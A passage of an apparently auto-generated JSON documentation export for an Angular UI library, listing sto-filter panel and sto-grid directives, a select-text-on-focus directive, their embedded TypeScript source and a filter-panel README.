@ViewChild('filterForm') filterForm: { nativeElement: HTMLElement; };\n\n  @Input()\n  public host: FilterForm<Record<string, unknown>>;\n  private _contentHeight: number;\n\n  public hasSeperator = false;\n\n  constructor(\n    private cdr: ChangeDetectorRef,\n    private vcRef: ViewContainerRef) {\n    try {\n      // eslint-disable-next-line @typescript-eslint/no-explicit-any\n      this.host = ( this.vcRef as any )._view.context;\n    } catch ( ex ) {\n      // most likely this fails only for tests after Ivy (Angular 9), as it no longer wraps with a component.\n    }\n  }\n\n  public toggle() {\n    this.expanded = !this.expanded;\n    this.setContentHeight();\n    this.toggled.emit({ isExpanded: this.expanded, contentHeight: this.contentHeight });\n  }\n\n  ngOnInit() {\n    if ( this.expandable ) {\n      if ( this.expanded === undefined ) {\n        this.expanded = true;\n      }\n    } else {\n      this.expanded = false;\n    }\n\n    this.needSeperator();\n  }\n\n  ngAfterViewInit() {\n    this.needSeperator();\n    this.setContentHeight();\n  }\n\n  private setContentHeight() {\n    const element = this.filterForm.nativeElement;\n    if ( element ) {\n      const contentArea = element.parentElement;\n      this.contentHeight = contentArea?.offsetHeight || 0;\n    }\n  }\n\n  public needSeperator() {\n    this.hasSeperator = false;\n    if ( this.contentWrapper && this.contentWrapper2 ) {\n      const el1 = this.contentWrapper.nativeElement;\n      const el2 = this.contentWrapper2.nativeElement;\n      if ( el1.children && el2.children ) {\n        if ( el1.children.length > 0 && el2.children.length > 0 ) {\n          const hasActionButtons = el1.children[ 0 ].children.length > 0;\n          const hasTableButtons = el2.children[ 0 ].children.length > 0;\n\n          this.hasSeperator = hasActionButtons && hasTableButtons;\n          this.cdr.detectChanges();\n        }\n      }\n    }\n\n\n  }\n\n  _clearFilter(key: string, index?: number) {\n    if (index === null) {\n      return;\n    }\n    try {\n      this.host.clearFilter(key, index);\n    } catch {\n      this.clearFilter.emit({ key, index });\n    }\n  }\n}\n\n/**\n * <mat-panel-description> directive.\n *\n * This direction is to be used inside of the MdExpansionPanelHeader component.\n */\n@Directive({\n  // eslint-disable-next-line @angular-eslint/directive-selector\n  selector: 'sto-filter-title'\n})\nexport class StoFilterTitle {\n}\n\n\n@Directive({\n  selector: 'sto-filter-table-actions'\n})\nexport class StoFilterTableActions {\n  @HostBinding('class.sto-filter-table-actions')\n  className = true;\n}\n\n@Directive({\n  selector: 'sto-filter-actions'\n})\nexport class StoFilterActions {\n}\n\n@Component({\n  selector: 'sto-filter-actions-bar',\n  template: `\n    <ng-content></ng-content>\n    <button mat-icon-button\n            class=\"toggle-expand-button\"\n            *ngIf=\"expandable\"\n            title=\"Toggle filter panel\"\n            (click)=\"toggle.emit()\">\n      <mat-icon>filter_list</mat-icon>\n    </button>\n\n  `\n})\n// eslint-disable-next-line @angular-eslint/component-class-suffix\nexport class StoFilterActionsBar {\n  @HostBinding('class.sto-filter-actions')\n  hasClass = true;\n\n  @Input() set expanded(expanded: boolean) {\n    this._expanded = expanded;\n  }\n\n  get expanded(): boolean {\n    return this._expanded;\n  }\n\n  @Input() expandable: boolean;\n  private _expanded: boolean;\n\n  @Output() toggle = new EventEmitter<void>();\n\n  // eslint-disable-next-line @typescript-eslint/no-unused-vars\n  onChange(event: unknown) {\n    // console.log($event);\n  }\n\n\n}\n\n",
      "selector": "sto-filter-table-actions",
      "providers": [],
      "inputsClass": [],
      "outputsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [
        {
          "name": "class.sto-filter-table-actions",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 174,
          "type": "boolean",
          "decorators": []
        }
      ],
      "hostListeners": [],
      "propertiesClass": [
        {
          "name": "className",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 174,
          "decorators": [
            {
              "name": "HostBinding",
              "stringifiedArguments": "'class.sto-filter-table-actions'"
            }
          ]
        }
      ],
      "methodsClass": [],
      "readme": "<h3 id=\"sto-filter-panel\">Sto filter panel</h3>\n<p>Filter panel is a togglable panel with a header and a content area, and is an extension of expansion panel from material.\nHas build in content areas for title, table actions and filter actions.\nThe panel has a toggle button that open and closes the content area and emits an event with the height of the content area.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot; (toggled)=&quot;toggleService.isToggled.emit($event)&quot;&gt;\n    &lt;sto-filter-title&gt;Integration Logs&lt;/sto-filter-title&gt;\n        &lt;sto-filter-table-actions&gt;\n           &lt;button mat-button&gt;\n           New&lt;mat-icon&gt;arrow_drop_down&lt;/mat-icon&gt;\n           &lt;/button&gt;    \n        &lt;/sto-filter-table-actions&gt;\n           &lt;sto-filter-actions&gt;\n                &lt;button mat-icon-button&gt;\n                  &lt;mat-icon&gt;refresh&lt;/mat-icon&gt;\n               &lt;/button&gt;\n            &lt;/sto-filter-actions&gt;\n        &lt;form class=&quot;sto-form sto-grid sto-grid--6&quot; [formGroup]=&quot;form&quot; &gt;\n             &lt;div class=&quot;sto-grid__column&quot;&gt;\n                   &lt;mat-form-field&gt;\n                     ...\n                    &lt;/mat-form-field&gt;\n             &lt;/div&gt;\n        &lt;/form&gt;\n&lt;/sto-filter-panel&gt;</code></pre></div><p>####Selector / Content projection</p>\n<h5 id=\"sto-filter-title\">sto-filter-title</h5>\n<p>The title. Usually just a string but could be html.</p>\n<h5 id=\"sto-filter-table-actions\">sto-filter-table-actions</h5>\n<p>Buttons and actions on the left side of the separator if both table and filter actions is present.\n(The name is from a time where all actions left of the separator was related to the table).</p>\n<h5 id=\"sto-filter-actions\">sto-filter-actions</h5>\n<p>Buttons and actions on the right side of the separator if both table and filter actions is present.\n(The name is from a time where all actions right of the separator was related to the table).</p>\n<p>####Input</p>\n<h5 id=\"expandable\">expandable</h5>\n<p>If the filter panel should be expandable. Default true.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot;&gt;</code></pre></div><h5 id=\"expanded\">expanded</h5>\n<p>If the filter panel should be expanded by default. Default false.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expanded]=&quot;true&quot;&gt;</code></pre></div><p>####Output</p>\n<h5 id=\"toggled\">toggled</h5>\n<p>Emits {isExpanded: boolean, contentHeight: number } where\nisExpanded is true if the panel opens and false if not.\nContentHeight is the height of the expanded content. </p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel (toggled)=&quot;onToggle($event)&quot;&gt;</code></pre></div>"
    },
    {
      "name": "StoFilterTitle",
      "id": "directive-StoFilterTitle-b0f9a90b956cb63ef40defdf7ae45c5b5a578a79df0bbb7e3133eff22d4ad449ab714db9d8e7ac0b02040c9a7543eda5a0c526091e497cc853019c112c2b8006",
      "file": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
      "type": "directive",
      "description": "<p><mat-panel-description> directive.</p>\n<p>This direction is to be used inside of the MdExpansionPanelHeader component.</p>\n",
      "rawdescription": "\n\n<mat-panel-description> directive.\n\nThis direction is to be used inside of the MdExpansionPanelHeader component.\n",
      "sourceCode": "import {\n  AfterViewInit,\n  ChangeDetectorRef,\n  Component,\n  Directive,\n  EventEmitter,\n  HostBinding,\n  Input,\n  OnInit,\n  Output,\n  ViewChild,\n  ViewContainerRef,\n  ViewEncapsulation\n} from '@angular/core';\nimport { FilterForm, FilterList } from './filter';\n\n/**\n * Sto filter panel is an extension of mat-accordion\n */\n@Component({\n  selector: 'sto-filter-panel',\n  templateUrl: './sto-filter-panel.component.html',\n  encapsulation: ViewEncapsulation.None,\n  styleUrls: [ './sto-filter-panel.component.scss' ]\n})\nexport class StoFilterPanelComponent implements OnInit, AfterViewInit {\n  set contentHeight(contentHeight: number) {\n    this._contentHeight = contentHeight;\n  }\n\n  get contentHeight(): number {\n    return this._contentHeight;\n  }\n\n  /**\n   * If the filter panel should be expandable. Default true.\n   */\n  @Input()\n  expandable = true;\n\n  /**\n   * If the filter panel should be expanded by default. Default false.\n   */\n  @Input()\n  expanded: boolean;\n\n  /**\n   * List of active filters.\n   */\n  @Input()\n  filterList: FilterList[];\n\n  /**\n   * Emits {isExpanded: boolean, contentHeight: number } where\n   * isExpanded is true if the panel opens and false if not.\n   * ContentHeight is the height of the expanded content i pixels.\n   *  {EventEmitter<{isExpanded: boolean, contentHeight: number }>}\n   */\n  @Output() toggled = new EventEmitter<{ isExpanded: boolean, contentHeight: number }>();\n  /**\n   * Emits when a filter should be cleared (if applicable)\n   */\n  @Output()\n  clearFilter = new EventEmitter();\n\n  /**\n   * Buttons and actions on the left side of the separator if both table and filter actions is present.\n   */\n  @ViewChild('tableActions') contentWrapper: { nativeElement: HTMLElement; };\n  /**\n   * Buttons and actions on the right side of the separator if both table and filter actions is present.\n   */\n  @ViewChild('filterActions') contentWrapper2: { nativeElement: HTMLElement; };\n  @ViewChild('filterForm') filterForm: { nativeElement: HTMLElement; };\n\n  @Input()\n  public host: FilterForm<Record<string, unknown>>;\n  private _contentHeight: number;\n\n  public hasSeperator = false;\n\n  constructor(\n    private cdr: ChangeDetectorRef,\n    private vcRef: ViewContainerRef) {\n    try {\n      // eslint-disable-next-line @typescript-eslint/no-explicit-any\n      this.host = ( this.vcRef as any )._view.context;\n    } catch ( ex ) {\n      // most likely this fails only for tests after Ivy (Angular 9), as it no longer wraps with a component.\n    }\n  }\n\n  public toggle() {\n    this.expanded = !this.expanded;\n    this.setContentHeight();\n    this.toggled.emit({ isExpanded: this.expanded, contentHeight: this.contentHeight });\n  }\n\n  ngOnInit() {\n    if ( this.expandable ) {\n      if ( this.expanded === undefined ) {\n        this.expanded = true;\n      }\n    } else {\n      this.expanded = false;\n    }\n\n    this.needSeperator();\n  }\n\n  ngAfterViewInit() {\n    this.needSeperator();\n    this.setContentHeight();\n  }\n\n  private setContentHeight() {\n    const element = this.filterForm.nativeElement;\n    if ( element ) {\n      const contentArea = element.parentElement;\n      this.contentHeight = contentArea?.offsetHeight || 0;\n    }\n  }\n\n  public needSeperator() {\n    this.hasSeperator = false;\n    if ( this.contentWrapper && this.contentWrapper2 ) {\n      const el1 = this.contentWrapper.nativeElement;\n      const el2 = this.contentWrapper2.nativeElement;\n      if ( el1.children && el2.children ) {\n        if ( el1.children.length > 0 && el2.children.length > 0 ) {\n          const hasActionButtons = el1.children[ 0 ].children.length > 0;\n          const hasTableButtons = el2.children[ 0 ].children.length > 0;\n\n          this.hasSeperator = hasActionButtons && hasTableButtons;\n          this.cdr.detectChanges();\n        }\n      }\n    }\n\n\n  }\n\n  _clearFilter(key: string, index?: number) {\n    if (index === null) {\n      return;\n    }\n    try {\n      this.host.clearFilter(key, index);\n    } catch {\n      this.clearFilter.emit({ key, index });\n    }\n  }\n}\n\n/**\n * <mat-panel-description> directive.\n *\n * This direction is to be used inside of the MdExpansionPanelHeader component.\n */\n@Directive({\n  // eslint-disable-next-line @angular-eslint/directive-selector\n  selector: 'sto-filter-title'\n})\nexport class StoFilterTitle {\n}\n\n\n@Directive({\n  selector: 'sto-filter-table-actions'\n})\nexport class StoFilterTableActions {\n  @HostBinding('class.sto-filter-table-actions')\n  className = true;\n}\n\n@Directive({\n  selector: 'sto-filter-actions'\n})\nexport class StoFilterActions {\n}\n\n@Component({\n  selector: 'sto-filter-actions-bar',\n  template: `\n    <ng-content></ng-content>\n    <button mat-icon-button\n            class=\"toggle-expand-button\"\n            *ngIf=\"expandable\"\n            title=\"Toggle filter panel\"\n            (click)=\"toggle.emit()\">\n      <mat-icon>filter_list</mat-icon>\n    </button>\n\n  `\n})\n// eslint-disable-next-line @angular-eslint/component-class-suffix\nexport class StoFilterActionsBar {\n  @HostBinding('class.sto-filter-actions')\n  hasClass = true;\n\n  @Input() set expanded(expanded: boolean) {\n    this._expanded = expanded;\n  }\n\n  get expanded(): boolean {\n    return this._expanded;\n  }\n\n  @Input() expandable: boolean;\n  private _expanded: boolean;\n\n  @Output() toggle = new EventEmitter<void>();\n\n  // eslint-disable-next-line @typescript-eslint/no-unused-vars\n  onChange(event: unknown) {\n    // console.log($event);\n  }\n\n\n}\n\n",
      "selector": "sto-filter-title",
      "providers": [],
      "inputsClass": [],
      "outputsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "propertiesClass": [],
      "methodsClass": [],
      "readme": "<h3 id=\"sto-filter-panel\">Sto filter panel</h3>\n<p>Filter panel is a togglable panel with a header and a content area, and is an extension of expansion panel from material.\nHas build in content areas for title, table actions and filter actions.\nThe panel has a toggle button that open and closes the content area and emits an event with the height of the content area.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot; (toggled)=&quot;toggleService.isToggled.emit($event)&quot;&gt;\n    &lt;sto-filter-title&gt;Integration Logs&lt;/sto-filter-title&gt;\n        &lt;sto-filter-table-actions&gt;\n           &lt;button mat-button&gt;\n           New&lt;mat-icon&gt;arrow_drop_down&lt;/mat-icon&gt;\n           &lt;/button&gt;    \n        &lt;/sto-filter-table-actions&gt;\n           &lt;sto-filter-actions&gt;\n                &lt;button mat-icon-button&gt;\n                  &lt;mat-icon&gt;refresh&lt;/mat-icon&gt;\n               &lt;/button&gt;\n            &lt;/sto-filter-actions&gt;\n        &lt;form class=&quot;sto-form sto-grid sto-grid--6&quot; [formGroup]=&quot;form&quot; &gt;\n             &lt;div class=&quot;sto-grid__column&quot;&gt;\n                   &lt;mat-form-field&gt;\n                     ...\n                    &lt;/mat-form-field&gt;\n             &lt;/div&gt;\n        &lt;/form&gt;\n&lt;/sto-filter-panel&gt;</code></pre></div><p>####Selector / Content projection</p>\n<h5 id=\"sto-filter-title\">sto-filter-title</h5>\n<p>The title. Usually just a string but could be html.</p>\n<h5 id=\"sto-filter-table-actions\">sto-filter-table-actions</h5>\n<p>Buttons and actions on the left side of the separator if both table and filter actions is present.\n(The name is from a time where all actions left of the separator was related to the table).</p>\n<h5 id=\"sto-filter-actions\">sto-filter-actions</h5>\n<p>Buttons and actions on the right side of the separator if both table and filter actions is present.\n(The name is from a time where all actions right of the separator was related to the table).</p>\n<p>####Input</p>\n<h5 id=\"expandable\">expandable</h5>\n<p>If the filter panel should be expandable. Default true.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot;&gt;</code></pre></div><h5 id=\"expanded\">expanded</h5>\n<p>If the filter panel should be expanded by default. Default false.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expanded]=&quot;true&quot;&gt;</code></pre></div><p>####Output</p>\n<h5 id=\"toggled\">toggled</h5>\n<p>Emits {isExpanded: boolean, contentHeight: number } where\nisExpanded is true if the panel opens and false if not.\nContentHeight is the height of the expanded content. </p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel (toggled)=&quot;onToggle($event)&quot;&gt;</code></pre></div>"
    },
    {
      "name": "StoGridColumnDirective",
      "id": "directive-StoGridColumnDirective-e445c114a94a880f4e19adbe60b844b93b2d147c2d1c348a323f971cda2e77f7091c36f0349c4a5305b582cb6ab5d85f00064ac77cc629943c62048d9c46a4e4",
      "file": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
      "type": "directive",
      "description": "",
      "rawdescription": "\n",
      "sourceCode": "import { AfterViewInit, ContentChildren, Directive, ElementRef, HostBinding, Input, OnDestroy, QueryList } from '@angular/core';\n\ninterface BreakpointConfig {\n  2: number;\n  4: number;\n}\n\nconst getClass = (width: number, small = 400, large = 800) => {\n  let cols = 1;\n  if ( width > small ) {\n    cols += 1;\n  }\n  if ( width > large ) {\n    cols += 2;\n  }\n  return `sto-f-grid--${cols}`;\n};\n\nconst ALL_GRIDS = [ 'sto-f-grid--1', 'sto-f-grid--2', 'sto-f-grid--4', 'sto-f-grid--6' ];\n\n@Directive({ selector: '[stoGridSpacer]' })\nexport class StoGridSpacerDirective {\n  @HostBinding('class.sto-f-grid__col')\n  @HostBinding('class.sto-f-grid__col--spacer')\n  useClass = true;\n}\n\n@Directive({ selector: '[stoGridColumn]' })\nexport class StoGridColumnDirective {\n  @HostBinding('class.sto-f-grid__col')\n  useClass = true;\n  @HostBinding('class.sto-f-grid__col--2')\n  @Input()\n  stoGridColumnDouble: boolean;\n\n}\n\n@Directive({\n  selector: '[stoGrid]',\n  exportAs: 'stoGrid'\n})\nexport class StoGridDirective implements AfterViewInit, OnDestroy {\n  @HostBinding('style.max-width.px')\n  @Input()\n  maxWidth = 1000;\n  @HostBinding('style.min-width.px')\n  @Input()\n  minWidth = 250;\n  @HostBinding('class.sto-f-grid')\n  baseClass = true;\n  @ContentChildren(StoGridColumnDirective, { read: ElementRef })\n  columns: QueryList<ElementRef<HTMLElement>>;\n  @Input()\n  breakpoints: BreakpointConfig;\n\n  private observer: ResizeObserver;\n\n  constructor(\n    private elRef: ElementRef<HTMLElement>,\n  ) {\n  }\n\n  ngAfterViewInit() {\n    const el = this.elRef.nativeElement as HTMLElement;\n    this.observer = new ResizeObserver(entries => {\n      for ( const entry of entries ) {\n        const cr = entry.contentRect;\n        const { width } = cr;\n        const breakpoints = this.breakpoints || { 2: 400, 4: 800 };\n        const gridType = getClass(width, breakpoints[ 2 ], breakpoints[ 4 ]);\n        if ( !el.classList.contains(gridType) ) {\n          el.classList.remove(...ALL_GRIDS);\n          el.classList.add(gridType);\n        }\n      }\n    });\n    this.observer.observe(this.elRef.nativeElement);\n  }\n\n  ngOnDestroy() {\n    if ( this.observer ) {\n      this.observer.disconnect();\n    }\n  }\n\n}\n\n",
      "selector": "[stoGridColumn]",
      "providers": [],
      "inputsClass": [
        {
          "name": "stoGridColumnDouble",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 34,
          "type": "boolean",
          "decorators": []
        }
      ],
      "outputsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [
        {
          "name": "class.sto-f-grid__col",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 31,
          "type": "boolean",
          "decorators": []
        }
      ],
      "hostListeners": [],
      "propertiesClass": [
        {
          "name": "useClass",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 31,
          "decorators": [
            {
              "name": "HostBinding",
              "stringifiedArguments": "'class.sto-f-grid__col'"
            }
          ]
        }
      ],
      "methodsClass": []
    },
    {
      "name": "StoGridDirective",
      "id": "directive-StoGridDirective-e445c114a94a880f4e19adbe60b844b93b2d147c2d1c348a323f971cda2e77f7091c36f0349c4a5305b582cb6ab5d85f00064ac77cc629943c62048d9c46a4e4",
      "file": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
      "type": "directive",
      "description": "",
      "rawdescription": "\n",
      "sourceCode": "import { AfterViewInit, ContentChildren, Directive, ElementRef, HostBinding, Input, OnDestroy, QueryList } from '@angular/core';\n\ninterface BreakpointConfig {\n  2: number;\n  4: number;\n}\n\nconst getClass = (width: number, small = 400, large = 800) => {\n  let cols = 1;\n  if ( width > small ) {\n    cols += 1;\n  }\n  if ( width > large ) {\n    cols += 2;\n  }\n  return `sto-f-grid--${cols}`;\n};\n\nconst ALL_GRIDS = [ 'sto-f-grid--1', 'sto-f-grid--2', 'sto-f-grid--4', 'sto-f-grid--6' ];\n\n@Directive({ selector: '[stoGridSpacer]' })\nexport class StoGridSpacerDirective {\n  @HostBinding('class.sto-f-grid__col')\n  @HostBinding('class.sto-f-grid__col--spacer')\n  useClass = true;\n}\n\n@Directive({ selector: '[stoGridColumn]' })\nexport class StoGridColumnDirective {\n  @HostBinding('class.sto-f-grid__col')\n  useClass = true;\n  @HostBinding('class.sto-f-grid__col--2')\n  @Input()\n  stoGridColumnDouble: boolean;\n\n}\n\n@Directive({\n  selector: '[stoGrid]',\n  exportAs: 'stoGrid'\n})\nexport class StoGridDirective implements AfterViewInit, OnDestroy {\n  @HostBinding('style.max-width.px')\n  @Input()\n  maxWidth = 1000;\n  @HostBinding('style.min-width.px')\n  @Input()\n  minWidth = 250;\n  @HostBinding('class.sto-f-grid')\n  baseClass = true;\n  @ContentChildren(StoGridColumnDirective, { read: ElementRef })\n  columns: QueryList<ElementRef<HTMLElement>>;\n  @Input()\n  breakpoints: BreakpointConfig;\n\n  private observer: ResizeObserver;\n\n  constructor(\n    private elRef: ElementRef<HTMLElement>,\n  ) {\n  }\n\n  ngAfterViewInit() {\n    const el = this.elRef.nativeElement as HTMLElement;\n    this.observer = new ResizeObserver(entries => {\n      for ( const entry of entries ) {\n        const cr = entry.contentRect;\n        const { width } = cr;\n        const breakpoints = this.breakpoints || { 2: 400, 4: 800 };\n        const gridType = getClass(width, breakpoints[ 2 ], breakpoints[ 4 ]);\n        if ( !el.classList.contains(gridType) ) {\n          el.classList.remove(...ALL_GRIDS);\n          el.classList.add(gridType);\n        }\n      }\n    });\n    this.observer.observe(this.elRef.nativeElement);\n  }\n\n  ngOnDestroy() {\n    if ( this.observer ) {\n      this.observer.disconnect();\n    }\n  }\n\n}\n\n",
      "selector": "[stoGrid]",
      "providers": [],
      "inputsClass": [
        {
          "name": "breakpoints",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 54,
          "type": "BreakpointConfig",
          "decorators": []
        },
        {
          "name": "maxWidth",
          "defaultValue": "1000",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 45,
          "type": "number",
          "decorators": []
        },
        {
          "name": "minWidth",
          "defaultValue": "250",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 48,
          "type": "number",
          "decorators": []
        }
      ],
      "outputsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [
        {
          "name": "class.sto-f-grid",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 50,
          "type": "boolean",
          "decorators": []
        }
      ],
      "hostListeners": [],
      "propertiesClass": [
        {
          "name": "baseClass",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 50,
          "decorators": [
            {
              "name": "HostBinding",
              "stringifiedArguments": "'class.sto-f-grid'"
            }
          ]
        },
        {
          "name": "columns",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "QueryList<ElementRef<HTMLElement>>",
          "optional": false,
          "description": "",
          "line": 52,
          "decorators": [
            {
              "name": "ContentChildren",
              "stringifiedArguments": "StoGridColumnDirective, {read: ElementRef}"
            }
          ]
        },
        {
          "name": "observer",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ResizeObserver",
          "optional": false,
          "description": "",
          "line": 56,
          "modifierKind": [
            121
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "ngAfterViewInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 63,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "ngOnDestroy",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 80,
          "deprecated": false,
          "deprecationMessage": ""
        }
      ],
      "implements": [
        "AfterViewInit",
        "OnDestroy"
      ],
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "elRef",
            "type": "ElementRef<HTMLElement>",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 56,
        "jsdoctags": [
          {
            "name": "elRef",
            "type": "ElementRef<HTMLElement>",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      }
    },
    {
      "name": "StoGridSpacerDirective",
      "id": "directive-StoGridSpacerDirective-e445c114a94a880f4e19adbe60b844b93b2d147c2d1c348a323f971cda2e77f7091c36f0349c4a5305b582cb6ab5d85f00064ac77cc629943c62048d9c46a4e4",
      "file": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
      "type": "directive",
      "description": "",
      "rawdescription": "\n",
      "sourceCode": "import { AfterViewInit, ContentChildren, Directive, ElementRef, HostBinding, Input, OnDestroy, QueryList } from '@angular/core';\n\ninterface BreakpointConfig {\n  2: number;\n  4: number;\n}\n\nconst getClass = (width: number, small = 400, large = 800) => {\n  let cols = 1;\n  if ( width > small ) {\n    cols += 1;\n  }\n  if ( width > large ) {\n    cols += 2;\n  }\n  return `sto-f-grid--${cols}`;\n};\n\nconst ALL_GRIDS = [ 'sto-f-grid--1', 'sto-f-grid--2', 'sto-f-grid--4', 'sto-f-grid--6' ];\n\n@Directive({ selector: '[stoGridSpacer]' })\nexport class StoGridSpacerDirective {\n  @HostBinding('class.sto-f-grid__col')\n  @HostBinding('class.sto-f-grid__col--spacer')\n  useClass = true;\n}\n\n@Directive({ selector: '[stoGridColumn]' })\nexport class StoGridColumnDirective {\n  @HostBinding('class.sto-f-grid__col')\n  useClass = true;\n  @HostBinding('class.sto-f-grid__col--2')\n  @Input()\n  stoGridColumnDouble: boolean;\n\n}\n\n@Directive({\n  selector: '[stoGrid]',\n  exportAs: 'stoGrid'\n})\nexport class StoGridDirective implements AfterViewInit, OnDestroy {\n  @HostBinding('style.max-width.px')\n  @Input()\n  maxWidth = 1000;\n  @HostBinding('style.min-width.px')\n  @Input()\n  minWidth = 250;\n  @HostBinding('class.sto-f-grid')\n  baseClass = true;\n  @ContentChildren(StoGridColumnDirective, { read: ElementRef })\n  columns: QueryList<ElementRef<HTMLElement>>;\n  @Input()\n  breakpoints: BreakpointConfig;\n\n  private observer: ResizeObserver;\n\n  constructor(\n    private elRef: ElementRef<HTMLElement>,\n  ) {\n  }\n\n  ngAfterViewInit() {\n    const el = this.elRef.nativeElement as HTMLElement;\n    this.observer = new ResizeObserver(entries => {\n      for ( const entry of entries ) {\n        const cr = entry.contentRect;\n        const { width } = cr;\n        const breakpoints = this.breakpoints || { 2: 400, 4: 800 };\n        const gridType = getClass(width, breakpoints[ 2 ], breakpoints[ 4 ]);\n        if ( !el.classList.contains(gridType) ) {\n          el.classList.remove(...ALL_GRIDS);\n          el.classList.add(gridType);\n        }\n      }\n    });\n    this.observer.observe(this.elRef.nativeElement);\n  }\n\n  ngOnDestroy() {\n    if ( this.observer ) {\n      this.observer.disconnect();\n    }\n  }\n\n}\n\n",
      "selector": "[stoGridSpacer]",
      "providers": [],
      "inputsClass": [],
      "outputsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [
        {
          "name": "class.sto-f-grid__col",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 25,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "class.sto-f-grid__col--spacer",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 25,
          "type": "boolean",
          "decorators": []
        }
      ],
      "hostListeners": [],
      "propertiesClass": [
        {
          "name": "useClass",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 25,
          "decorators": [
            {
              "name": "HostBinding",
              "stringifiedArguments": "'class.sto-f-grid__col'"
            },
            {
              "name": "HostBinding",
              "stringifiedArguments": "'class.sto-f-grid__col--spacer'"
            }
          ]
        }
      ],
      "methodsClass": []
    },
    {
      "name": "StoSelectTextOnFocusDirective",
      "id": "directive-StoSelectTextOnFocusDirective-94c83608b16db076b4740d280a83a52323d9004872007e0ffcf52b80f5174daffabd137368bb4c8e8a58f53c8dccb52891de292275a77a5ad5b616ea209ed71c",
      "file": "libs/core/src/lib/sto-directives/sto-select-text-on-focus.directive.ts",
      "type": "directive",
      "description": "<p>stoSelectTextOnFocus listens for input focus events, and selects the contents of the input\nA user service is established in {@link StoUserPreferenceService} that allows a user to toggle this feature</p>\n",
      "rawdescription": "\n\nstoSelectTextOnFocus listens for input focus events, and selects the contents of the input\nA user service is established in {@link StoUserPreferenceService} that allows a user to toggle this feature\n",
      "sourceCode": "import { Directive, ElementRef, HostListener, OnDestroy, OnInit, Optional } from '@angular/core';\nimport { Subject } from 'rxjs';\nimport { StoUserPreferenceService } from '../sto-user-preference/sto-user-preference.service';\nimport { takeUntil } from 'rxjs/operators';\n\n/**\n * stoSelectTextOnFocus listens for input focus events, and selects the contents of the input\n * A user service is established in {@link StoUserPreferenceService} that allows a user to toggle this feature\n */\n@Directive({\n  selector: '[stoSelectTextOnFocus]'\n})\nexport class StoSelectTextOnFocusDirective implements OnInit, OnDestroy {\n\n  private destroyed$ = new Subject<boolean>();\n\n  private _hasSelectTextOnFocusEnabled: boolean;\n  private _el: HTMLInputElement;\n\n  constructor(private elementRef: ElementRef, @Optional() private userPreferenceService: StoUserPreferenceService) {\n    this._el = this.elementRef.nativeElement;\n  }\n\n  /**\n   * Listens for focus events on the host (input) element, and focuses if applicable\n   */\n  @HostListener('focus')\n  @HostListener('dblclick')\n  onFocus() {\n    if ( this._hasSelectTextOnFocusEnabled && this._el.readOnly === false ) {\n      this._el.select();\n    }\n\n  }\n\n  /**\n   * Subscribes to changes in {@link StoUserPreferenceService}, and binds the variable accordingly.\n   */\n  ngOnInit() {\n    if ( this.userPreferenceService ) {\n      this.userPreferenceService.hasSelectTextOnFocusEnabled\n        .pipe(\n          takeUntil(this.destroyed$)\n        ).subscribe((hasSelectTextOnFocusEnabled) => {\n        this._hasSelectTextOnFocusEnabled = hasSelectTextOnFocusEnabled;\n      });\n    }\n  }\n\n  ngOnDestroy() {\n    this.destroyed$.next(true);\n    this.destroyed$.complete();\n  }\n\n}\n",
      "selector": "[stoSelectTextOnFocus]",
      "providers": [],
      "inputsClass": [],
      "outputsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [
        {
          "name": "dblclick",
          "args": [],
          "argsDecorator": [],
          "deprecated": false,
